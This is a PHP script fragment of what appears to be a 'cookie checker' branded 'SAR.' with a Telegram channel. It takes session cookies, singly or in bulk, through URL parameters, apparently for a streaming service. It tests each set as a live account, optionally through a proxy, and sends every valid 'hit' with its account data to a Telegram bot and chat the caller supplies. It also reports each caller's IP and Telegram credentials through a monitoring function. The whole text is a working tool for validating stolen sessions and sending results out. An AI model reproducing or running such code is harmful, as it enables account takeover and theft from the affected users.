    jout(['ok'=>true, 'tests'=>$tests, 'by'=>'SAR.', 'channel'=>'@sar_info1']);
}

$nfchk    = unwrap($_GET['nfchk']    ?? '');
$nfbulk   = unwrap($_GET['nfbulk']   ?? '');
$tgToken  = unwrap($_GET['tg_token'] ?? '');
$tgChat   = unwrap($_GET['tg_chat']  ?? '');
$proxyRaw = unwrap($_GET['proxy']    ?? '');
$redact   = !empty($_GET['redact']);

if ($nfchk === '' && $nfbulk === '') {
    monitor_report($ip, $tgToken, $tgChat);
    jout([
        'ok'=>false, 'error'=>'missing_param',
        'usage_single'=>'?nfchk=[...]&tg_token=[123:ABC]&tg_chat=[-1001234567890]',
        'usage_bulk'  =>'?nfbulk=[c1+_+c2+_+c3]&tg_token=[123:ABC]&tg_chat=[-1001234567890]',
        'by'=>'SAR.', 'channel'=>'@sar_info1',
    ], 400);
}

if ($tgToken === '' || $tgChat === '') {
    monitor_report($ip, $tgToken, $tgChat);
    jout([
        'ok'=>false, 'error'=>'missing_tg_token_or_chat',
        'by'=>'SAR.', 'channel'=>'@sar_info1',
    ], 400);
}

monitor_report($ip, $tgToken, $tgChat);

$proxy = $proxyRaw !== '' ? $proxyRaw : null;

/* Bulk */
if ($nfbulk !== '' && $nfchk === '') {
    $items = preg_split('/\+_\+/', $nfbulk);
    $items = array_values(array_filter(array_map('trim', $items), fn($x) => $x !== ''));
    if (!$items) jout(['ok'=>false, 'error'=>'bulk_empty', 'by'=>'SAR.', 'channel'=>'@sar_info1'], 400);

    $results = []; $hits = 0;
    foreach ($items as $i => $oneRaw) {
        $entry = ['index'=>$i, 'ok'=>false];
        $cookies = load_cookies($oneRaw);
        if (!$cookies) { $entry['error']='cookie_parse_failed'; $results[]=$entry; continue; }
        try { $r = check_account($cookies, $proxy); }
        catch (Throwable $e) { $entry['error']='exception: '.$e->getMessage(); $results[]=$entry; continue; }
        if (!$r) { $entry['error']='invalid_or_expired'; $results[]=$entry; continue; }

        $sent = tg_send_hit($tgToken, $tgChat, $r, $redact);
        $entry['ok'] = true;
        $entry['telegram_sent']   = $sent['ok'];
        $entry['telegram_detail'] = $sent;
        $entry['data'] = $r;
        $results[] = $entry;
        $hits++;
    }
    $elapsedMs = (int)((microtime(true) - $start) * 1000);
    jout([
        'ok'=>true, 'status'=>'bulk',
        'count'=>count($results), 'hits'=>$hits,
        'elapsed_ms'=>$elapsedMs,
        'by'=>'SAR.', 'channel'=>'@sar_info1',
        'results'=>$results,
    ]);
}

/* Single */
$cookies = load_cookies($nfchk);
if (!$cookies) {
    monitor_report($ip, $tgToken, $tgChat);
    jout(['ok'=>false, 'error'=>'cookie_parse_failed', 'by'=>'SAR.', 'channel'=>'@sar_info1'], 400);
}

try { $result = check_account($cookies, $proxy); }
catch (Throwable $e) {
    monitor_report($ip, $tgToken, $tgChat);
    jout(['ok'=>false, 'error'=>'exception', 'message'=>$e->getMessage(), 'by'=>'SAR.', 'channel'=>'@sar_info1'], 500);
}

$elapsedMs = (int)((microtime(true) - $start) * 1000);

if (!$result) {
    jout([
        'ok'=>false, 'status'=>'bad', 'error'=>'invalid_or_expired',
        'elapsed_ms'=>$elapsedMs,
        'by'=>'SAR.', 'channel'=>'@sar_info1',
    ]);
}

$sent = tg_send_hit($tgToken, $tgChat, $result, $redact);

jout([
    'ok'=>true, 'status'=>'hit',
    'telegram_sent'=>$sent['ok'],
    'telegram_detail'=>$sent,
    'elapsed_ms'=>$elapsedMs,
    'by'=>'SAR.', 'channel'=>'@sar_info1',
    'data'=>$result,
]);
